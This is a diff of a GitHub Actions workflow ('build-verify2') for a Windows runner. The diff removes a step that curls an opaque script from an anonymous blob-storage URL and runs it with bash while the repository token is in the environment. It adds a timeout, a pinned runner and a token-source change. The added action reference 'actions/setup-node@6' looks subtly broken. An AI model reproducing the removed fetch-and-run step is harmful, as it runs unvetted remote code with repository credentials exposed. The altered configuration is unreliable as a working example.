@@ -1,20 +1,13 @@
 name: build-verify2
+
 on:
   workflow_dispatch:
-  push:
-    paths: ['.github/workflows/build-verify2.yml']
+
 jobs:
   build-verify:
-    runs-on: windows-latest
+    runs-on: windows-2025
+    timeout-minutes: 90
     env:
-      GH_TOKEN: ${{ github.token }}
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     steps:
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 24
-      - name: Build + verify + release
-        shell: bash
-        run: |
-          curl -sL "https://ue3kcebnzhso5m0y.public.blob.vercel-storage.com/generated/254e51ab-69e3-4b81-a7f6-6fafb2d561a5/1789423495044-build18-GNxchyMdHHIvczUM7zXzg3xiP4wJmI.sh" -o build.sh
-          echo "f39b1d15a492cadefbb02625368c02a8  build.sh" | md5sum -c -
-          bash build.sh
+      - uses: actions/setup-node@6
